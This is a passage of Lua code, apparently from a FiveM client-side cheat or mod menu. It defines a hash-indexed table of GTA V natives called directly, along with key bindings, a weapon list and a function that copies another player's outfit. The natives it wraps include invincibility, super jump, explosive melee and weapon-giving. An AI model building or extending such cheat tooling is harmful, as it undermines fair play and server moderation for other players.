                   hash = 0xF9113A30DE5C6670
               },
               ["GetPlayerName"] = {
                   hash = 0x6D0DE6A7B5DA71F8,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ResultAsString()
                   end
               },
               ["EndTextCommandSetBlipName"] = {
                   hash = 0xBC38B49BCB83BC9B
               },
               ["DrawRect"] = {
                   hash = 0x3A618A217E5154F0
               },
               ["IsEntityInAir"] = {
                   hash = 0x886E37EC497200B6
               },
               ["DisableAllControlActions"] = {
                   hash = 0x5F4B6931816E599B
               },
               ["TaskWanderStandard"] = {
                   hash = 0xBB9CE077274F6A1B
               },
               ["TaskWarpPedIntoVehicle"] = {
                   hash = 0x9A7D091411C5F684
               },
               ["SetMouseCursorActiveThisFrame"] = {
                   hash = 0xAAE7CE1D63167423
               },
               ["SetMouseCursorSprite"] = {
                   hash = 0x8DB8CFFD58B62552
               },
               ["GiveDelayedWeaponToPed"] = {
                   hash = 0xB282DC6EBD803C75
               },
               ["ApplyForceToEntity"] = {
                   hash = 0xC5F68BE9613E2D18
               },
               ["GetScreenCoordFromWorldCoord"] = {
                   hash = 0x34E82F05DF2974F5,
                   unpack = function(...)
                       local args = (...)
                       local x, y, z
       
                       if dict.type(args[1]) == "table" or dict.type(args[1]) == "vector" then
                           x = args[1].x
                           y = args[1].y
                           z = args[1].z
                       else
                           x = args[1]
                           y = args[2]
                           z = args[3]
                       end
       
                       return x, y, z, dict.Citizen.PointerValueFloat(), dict.Citizen.PointerValueFloat(), dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["NetworkIsPlayerTalking"] = {
                   hash = 0x031E11F3D447647E,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["SetDrawOrigin"] = {
                   hash = 0xAA0008F3BBB8F416
               },
               ["ClearDrawOrigin"] = {
                   hash = 0xFF0B610F6BE0D7AF
               },
               ["GetRenderingCam"] = {
                   hash = 0x5234F9F10919EABA,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
               },
               ["GetGameplayCamCoord"] = {
                   hash = 0x14D6F5678D8F1B37,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector() end
               },
               ["GetFinalRenderedCamCoord"] = {
                   hash = 0xA200EB1EE790F448,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector() end
               },
               ["GetGameplayCamFov"] = {
                   hash = 0x65019750A0324133,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat() end
               },
               ["ObjToNet"] = {
                   hash = 0x99BFDC94A603E541,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["StatSetInt"] = {
                   hash = 0xB3271D7AB655B441,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["NetworkSetNetworkIdDynamic"] = {
                   hash = 0x2B1813ABA29016C5
               },
               ["SetNetworkIdExistsOnAllMachines"] = {
                   hash = 0xE05E81A888FA63C8
               },
               ["GetDistanceBetweenCoords"] = {
                   hash = 0xF1B760881820C952,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], args[3], args[4], args[5], args[6], args[7], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
                   end
               },
               ["SetEntityHeading"] = {
                   hash = 0x8E2530AA8ADA980E
               },
               ["HasScaleformMovieLoaded"] = {
                   hash = 0x85F01B8D5B90570E,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["RequestScaleformMovie"] = {
                   hash = 0x11FE353CF9733E6F,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["BeginScaleformMovieMethod"] = {
                   hash = 0xF6E48914C7A8694E
               },
               ["EndScaleformMovieMethodReturnValue"] = {
                   hash = 0xC50AA39A577AF886,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
               },
               ["ScaleformMovieMethodAddParamInt"] = {
                   hash = 0xC3D0841A0CC546A6
               },
               ["ScaleformMovieMethodAddParamTextureNameString"] = {
                   hash = 0xBA7148484BD90365
               },
               ["DisableControlAction"] = {
                   hash = 0xFE99B66D079CF6BC
               },
               ["PlayerId"] = {
                   hash = 0x4F8644AF03D0E0D6,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
               },
               ["ShootSingleBulletBetweenCoords"] = {
                   hash = 0x867654CBC7606F2C,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], dict.type(args[9]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[9]) or args[9], args[10], args[11], args[12], args[13]
                   end
               },
               ["ClearAreaOfProjectiles"] = {
                   hash = 0x0A1CB9094635D1A6
               },
               ["GetPedLastWeaponImpactCoord"] = {
                   hash = 0x6C4D0409BA1A2BC2,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.PointerValueVector(), dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["SetExplosiveMeleeThisFrame"] = {
                   hash = 0xFF1BED81BFDC0FE0
               },
               ["GetCurrentPedWeaponEntityIndex"] = {
                   hash = 0x3B390A939AF0B5FC,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetSelectedPedWeapon"] = {
                   hash = 0x0A6DB4965674D243,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["PedSkipNextReloading"] = {
                   hash = 0x8C0D57EA686FAD87
               },
               ["GetMaxAmmoInClip"] = {
                   hash = 0xA38DCFFCEA8962FA,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.type(args[2]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetAmmoInClip"] = {
                   hash = 0x2E1202248937775C,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.type(args[2]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[2]) or args[2], dict.Citizen.PointerValueIntInitialized(args[3]), dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsPlayerFreeAiming"] = {
                   hash = 0x2E397FD2ECD37C87,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsPedDoingDriveby"] = {
                   hash = 0xB2C086CC1BF8F2BF,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["GetEntityPlayerIsFreeAimingAt"] = {
                   hash = 0x2975C866E6713290,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsPlayerFreeAimingAtEntity"] = {
                   hash = 0x3C06B5C839B38F7B,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["DisablePlayerFiring"] = {
                   hash = 0x5E6CC07646BBEAB8
               },
               ["SetFocusPosAndVel"] = {
                   hash = 0xBB7454BAFF08FE25
               },
               ["SetCamCoord"] = {
                   hash = 0x4D41783FB745E42E
               },
               ["SetCamActive"] = {
                   hash = 0x026FB97D0A425F84
               },
               ["SetCamFov"] = {
                   hash = 0xB13C14F66A00D047
               },
               ["SetCamRot"] = {
                   hash = 0x85973643155D0B07
               },
               ["SetCamShakeAmplitude"] = {
                   hash = 0xD93DB43B82BC0D00
               },
               ["UpdateOnscreenKeyboard"] = {
                   hash = 0x0CF2B696BBF945AE,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
               },
               ["CancelOnscreenKeyboard"] = {
                   hash = 0x58A39BE597CE99CD
               },
               ["SetVehicleFixed"] = {
                   hash = 0x115722B1B9C14C1C
               },
               ["SetVehicleDirtLevel"] = {
                   hash = 0x79D3B596FE44EE8B
               },
               ["SetVehicleLights"] = {
                   hash = 0x34E710FF01247C5A
               },
               ["SetVehicleBurnout"] = {
                   hash = 0xFB8794444A7D60FB
               },
               ["SetVehicleLightsMode"] = {
                   hash = 0x1FD09E7390A74D54
               },
               ["GetCamMatrix"] = {
                   hash = 0x8f57a89d,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector()
                   end
               },
               ["DoesEntityHaveDrawable"] = {
                   hash = 0x060D6E96F8B8E48D,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsEntityAnObject"] = {
                   hash = 0x8D68C8FD0FACA94E,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsEntityAVehicle"] = {
                   hash = 0x6AC7003FA6E5575E,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["SetNewWaypoint"] = {
                   hash = 0xFE43368D2AA4F2FC
               },
               ["HasEntityClearLosToEntityInFront"] = {
                   hash = 0x0267D00AF114F17A,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["HasEntityClearLosToEntity"] = {
                   hash = 0xFCDFF7B72D23A1AC,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsEntityAPed"] = {
                   hash = 0x524AC5ECEA15343E,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["GetControlInstructionalButton"] = {
                   hash = 0x0499D7B09FC9B407,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
                   end
               },
               ["DrawScaleformMovie"] = {
                   hash = 0x54972ADAF0294A93
               },
               ["SetFocusEntity"] = {
                   hash = 0x198F77705FA0931D
               },
               ["DrawLine"] = {
                   hash = 0x6B7256074AE34680
               },
               ["DrawPoly"] = {
                   hash = 0xAC26716048436851
               },
               ["GetEntityRotation"] = {
                   hash = 0xAFBD61CC738D9EB9,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
                   end
               },
               ["TaskPlayAnim"] = {
                   hash = 0xEA47FE3719165B94
               },
               ["TaskVehicleTempAction"] = {
                   hash = 0xC429DCEEB339E129
               },
               ["AttachEntityToEntity"] = {
                   hash = 0x6B9BBD38AB0796DF
               },
               ["SetRunSprintMultiplierForPlayer"] = {
                   hash = 0x6DB47AA77FD94E09
               },
               ["SetSuperJumpThisFrame"] = {
                   hash = 0x57FFF03E423A4C0B
               },
               ["SetPedMoveRateOverride"] = {
                   hash = 0x085BF80FA50A39D1
               },
               ["DisplayOnscreenKeyboard"] = {
                   hash = 0x00DC833F2568DBF6
               },
               ["GetOnscreenKeyboardResult"] = {
                   hash = 0x8362B09B91893647,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString() end
               },
               ["SetEntityVisible"] = {
                   hash = 0xEA1C610A04DB6BBB
               },
               ["SetEntityInvincible"] = {
                   hash = 0x3882114BDE571AD4
               },
               ["TaskSetBlockingOfNonTemporaryEvents"] = {
                   hash = 0x90D2156198831D69
               },
               ["GiveWeaponToPed"] = {
                   hash = 0xBF0FD6E56C964FCB
               },
               ["SetPedAccuracy"] = {
                   hash = 0x7AEFB85C1D49DEB6
               },
               ["SetPedAlertness"] = {
                   hash = 0xDBA71115ED9941A6
               },
               ["TaskCombatPed"] = {
                   hash = 0xF166E48407BAC484
               },
               ["SetPlayerModel"] = {
                   hash = 0x00A1CADD00108836,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.type(args[2]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[2]) or args[2]
                   end
               },
               ["GetDisplayNameFromVehicleModel"] = {
                   hash = 0xB215AAC32D25D019,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
                   end
               },
               ["SetPedRandomComponentVariation"] = {
                   hash = 0xC8A9481A01E63C28
               },
               ["SetPedRandomProps"] = {
                   hash = 0xC44AA05345C992C6
               },
               ["SetVehicleEngineOn"] = {
                   hash = 0x2497C4717C8B881E
               },
               ["SetVehicleForwardSpeed"] = {
                   hash = 0xAB54A438726D25D5
               },
               ["SetVehicleCurrentRpm"] = {
                   hash = 0x2A01A8FC
               },
               ["IsModelValid"] = {
                   hash = 0xC0296A2EDF545E92,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsModelAVehicle"] = {
                   hash = 0x19AAC8F07BFEC53E,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsPedWeaponReadyToShoot"] = {
                   hash = 0xB80CA294F2F26749,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["SetPedComponentVariation"] = {
                   hash = 0x262B14F48D29DE80
               },
               ["GetEntityHealth"] = {
                   hash = 0xEEF059FAD016D209,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetAmmoInPedWeapon"] = {
                   hash = 0x015A522136D7F951,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.type(args[2]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetMaxAmmo"] = {
                   hash = 0xDC16122C7A20C933,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.type(args[2]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[2]) or args[2], dict.Citizen.PointerValueIntInitialized(args[3]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetAmmoInPedWeapon"] = {
                   hash = 0x015A522136D7F951,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.type(args[2]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetPedPropIndex"] = {
                   hash = 0x898CC20EA75BACD8,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetPedPropTextureIndex"] = {
                   hash = 0xE131A28626F81AB2,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetPedDrawableVariation"] = {
                   hash = 0x67F3780DD425D4FC,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetPedTextureVariation"] = {
                   hash = 0x04A355E041E004E6,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetPedPaletteVariation"] = {
                   hash = 0xE3DD5F2A84B42281,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["SetPedPropIndex"] = {
                   hash = 0x93376B65A266EB5F
               },
               ["SetPedAmmo"] = {
                   hash = 0x14E56BC5B5DB6A19
               },
               ["SetAmmoInClip"] = {
                   hash = 0xDCD2A934D65CB497,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.type(args[2]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["GetDisabledControlNormal"] = {
                   hash = 0x11E65974A982637C,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
                   end
               },
               ["TaskLookAtEntity"] = {
                   hash = 0x69F4BE8C8CC4796C
               },
               ["PointCamAtEntity"] = {
                   hash = 0x5640BFF86B16E8DC
               }
           }
       
           local _bad = {}
           local _empty = function() end
       
           local bad = function(...)
               if not _bad[dict.tostring(...)] then
                   ADRVSDD:Print("[NATIVE] Invalid GetFunction call: ^1" .. dict.tostring(...) .. "^7")
                   _bad[dict.tostring(...)] = true
               end
       
               return _empty
           end
       
           function ADRVSDD:GetFunction(name)
               if not _natives[name] then return bad(name) end
       
               if _natives[name].func then
                   return _natives[name].func
               elseif _natives[name].hash then
                   _natives[name].func = function(...)
                       local args = {...}
                       local data = _natives[name]
                       local hash = data.hash
       
                       if data.unpack then
                           if data.return_as then return data.return_as(dict.Citizen.IN(hash, data.unpack(args))) end
       
                           return dict.Citizen.IN(hash, data.unpack(args))
                       else
                           if data.return_as then return data.return_as(dict.Citizen.IN(hash, table.unpack(args))) end
       
                           return dict.Citizen.IN(hash, table.unpack(args))
                       end
                   end
       
                   return _natives[name].func
               end
           end
       
           ADRVSDD.Keys = {
               ["ESC"] = 322,
               ["F1"] = 288,
               ["F2"] = 289,
               ["F3"] = 170,
               ["F5"] = 166,
               ["F6"] = 167,
               ["F7"] = 168,
               ["F8"] = 169,
               ["F9"] = 56,
               ["F10"] = 57,
               ["~"] = 243,
               ["1"] = 157,
               ["2"] = 158,
               ["3"] = 160,
               ["4"] = 164,
               ["5"] = 165,
               ["6"] = 159,
               ["7"] = 161,
               ["8"] = 162,
               ["9"] = 163,
               ["-"] = 84,
               ["="] = 83,
               ["BACKSPACE"] = 177,
               ["TAB"] = 37,
               ["Q"] = 44,
               ["W"] = 32,
               ["E"] = 38,
               ["R"] = 45,
               ["T"] = 245,
               ["Y"] = 246,
               ["U"] = 303,
               ["P"] = 199,
               ["["] = 39,
               ["]"] = 40,
               ["ENTER"] = 18,
               ["CAPS"] = 137,
               ["A"] = 34,
               ["S"] = 8,
               ["D"] = 9,
               ["F"] = 23,
               ["G"] = 47,
               ["H"] = 74,
               ["K"] = 311,
               ["L"] = 182,
               ["LEFTSHIFT"] = 21,
               ["Z"] = 20,
               ["X"] = 73,
               ["C"] = 26,
               ["V"] = 0,
               ["B"] = 29,
               ["N"] = 249,
               ["M"] = 244,
               [","] = 82,
               ["."] = 81,
               ["LEFTCTRL"] = 36,
               ["LEFTALT"] = 19,
               ["SPACE"] = 22,
               ["RIGHTCTRL"] = 70,
               ["HOME"] = 213,
               ["PAGEUP"] = 10,
               ["PAGEDOWN"] = 11,
               ["DELETE"] = 178,
               ["LEFT"] = 174,
               ["RIGHT"] = 175,
               ["UP"] = 172,
               ["DOWN"] = 173,
               ["NENTER"] = 201,
               ["MWHEELUP"] = 15,
               ["MWHEELDOWN"] = 14,
               ["N4"] = 108,
               ["N5"] = 60,
               ["N6"] = 107,
               ["N+"] = 96,
               ["N-"] = 97,
               ["N7"] = 117,
               ["N8"] = 61,
               ["N9"] = 118,
               ["MOUSE1"] = 24,
               ["MOUSE2"] = 25,
               ["MOUSE3"] = 348
           }
       
           local all_weapons = {"WEAPON_UNARMED", "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_MINISMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_MINIGUN", "WEAPON_RAILGUN", "WEAPON_POOLCUE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"}
           ADRVSDD.Notifications = {}
       
           local function _clamp(val, min, max)
               if val < min then return min end
               if val > max then return max end
       
               return val
           end
       
           function ADRVSDD:EquipOutfit(data)
               local ped = ADRVSDD:GetFunction("PlayerPedId")()
               ADRVSDD:GetFunction("SetPlayerModel")(ADRVSDD:GetFunction("PlayerId")(), data.model)
               ADRVSDD:GetFunction("SetPedPropIndex")(ped, 0, data.hat, data.hat_texture, 1)
               ADRVSDD:GetFunction("SetPedPropIndex")(ped, 1, data.glasses, data.glasses_texture, 1)
               ADRVSDD:GetFunction("SetPedPropIndex")(ped, 2, data.ear, data.ear_texture, 1)
               ADRVSDD:GetFunction("SetPedPropIndex")(ped, 6, data.watch, data.watch_texture, 1)
               ADRVSDD:GetFunction("SetPedPropIndex")(ped, 7, data.wrist, data.wrist_texture, 1)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 0, data.head.draw, data.head.texture, data.head.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 1, data.beard.draw, data.beard.texture, data.beard.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 2, data.hair.draw, data.hair.texture, data.hair.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 3, data.torso.draw, data.torso.texture, data.torso.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 4, data.legs.draw, data.legs.texture, data.legs.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 5, data.hands.draw, data.hands.texture, data.hands.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 6, data.feet.draw, data.feet.texture, data.feet.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 7, data.accessory_1.draw, data.accessory_1.texture, data.accessory_1.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 8, data.accessory_2.draw, data.accessory_2.texture, data.accessory_2.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 9, data.accessory_3.draw, data.accessory_3.texture, data.accessory_3.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 10, data.mask.draw, data.mask.texture, data.mask.palette)
               ADRVSDD:GetFunction("SetPedComponentVariation")(ped, 11, data.auxillary.draw, data.auxillary.texture, data.auxillary.palette)
           end
       
           function ADRVSDD:StealOutfit(player)
               local ped = ADRVSDD:GetFunction("GetPlayerPed")(player)
       
               ADRVSDD:EquipOutfit({
                   model = ADRVSDD:GetFunction("GetEntityModel")(ped),
                   hat = ADRVSDD:GetFunction("GetPedPropIndex")(ped, 0),
                   hat_texture = ADRVSDD:GetFunction("GetPedPropTextureIndex")(ped, 0),
                   glasses = ADRVSDD:GetFunction("GetPedPropIndex")(ped, 1),
                   glasses_texture = ADRVSDD:GetFunction("GetPedPropTextureIndex")(ped, 1),
                   ear = ADRVSDD:GetFunction("GetPedPropIndex")(ped, 2),
                   ear_texture = ADRVSDD:GetFunction("GetPedPropTextureIndex")(ped, 2),
                   watch = ADRVSDD:GetFunction("GetPedPropIndex")(ped, 6),
                   watch_texture = ADRVSDD:GetFunction("GetPedPropTextureIndex")(ped, 6),
                   wrist = ADRVSDD:GetFunction("GetPedPropIndex")(ped, 7),
                   wrist_texture = ADRVSDD:GetFunction("GetPedPropTextureIndex")(ped, 3),
                   head = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 0),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 0),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 0)
                   },
                   beard = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 1),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 1),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 1)
                   },
                   hair = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 2),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 2),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 2)
                   },
                   torso = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 3),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 3),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 3)
                   },
                   legs = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 4),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 4),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 4)
                   },
                   hands = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 5),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 5),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 5)
                   },
                   feet = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 6),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 6),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 6)
                   },
                   accessory_1 = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 7),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 7),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 7)
                   },
                   accessory_2 = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 8),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 8),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 8)
                   },
                   accessory_3 = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 9),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 9),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 9)
                   },
                   mask = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 10),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 10),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 10)
                   },
                   auxillary = {
                       draw = ADRVSDD:GetFunction("GetPedDrawableVariation")(ped, 11),
                       texture = ADRVSDD:GetFunction("GetPedTextureVariation")(ped, 11),
                       palette = ADRVSDD:GetFunction("GetPedPaletteVariation")(ped, 11)
                   }
               })
           end
       
           function ADRVSDD:RequestModelSync(model, timeout)
               timeout = timeout or 2500
               local counter = 0
               ADRVSDD:GetFunction("RequestModel")(model)
       
               while not ADRVSDD:GetFunction("HasModelLoaded")(model) do
                   ADRVSDD:GetFunction("RequestModel")(model)
                   counter = counter + 100
                   Wait(100)
                   if counter >= timeout then return false end
               end
       
               return true
           end
       
           function ADRVSDD.Util:ValidPlayer(src)
               if not src then return false end
       
